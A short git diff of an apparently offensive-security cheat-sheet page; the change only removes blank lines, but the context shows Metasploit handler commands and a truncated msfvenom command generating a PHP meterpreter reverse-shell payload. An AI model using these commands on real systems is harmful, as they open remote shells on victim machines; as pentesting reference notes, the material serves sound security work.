@@ -5,7 +5,6 @@ permalink: /snippets
 ---
 
 ### Metasploit
-
 #### Handlers
 
 ```bash 
@@ -19,7 +18,6 @@ msf6 > exploit -j -z
 Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r 
 
 #### Scripting Payloads
-
 ###### PHP
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> 
